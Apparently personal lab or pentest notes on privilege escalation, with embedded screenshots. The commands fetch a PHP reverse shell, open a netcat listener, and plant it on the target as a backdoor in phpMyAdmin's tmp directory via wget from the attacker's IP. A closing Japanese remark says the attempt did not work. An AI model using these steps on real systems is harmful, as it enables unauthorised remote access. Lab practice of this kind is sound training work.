![[Priv image 10.png]]

![[Priv image 11.png]]

Kali:

wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php

vi rev.php

![[Priv image 12.png]]

start HTTP server.

nc -lvnp 443

Target:

wget http://192.168.45.186/rev.php -O /usr/local/www/apache24/data/phpMyAdmin/tmp/backdoor.php

doas service apache24 onestart

curl http://127.0.0.1/phpMyAdmin/tmp/backdoor.php

※うまくいかず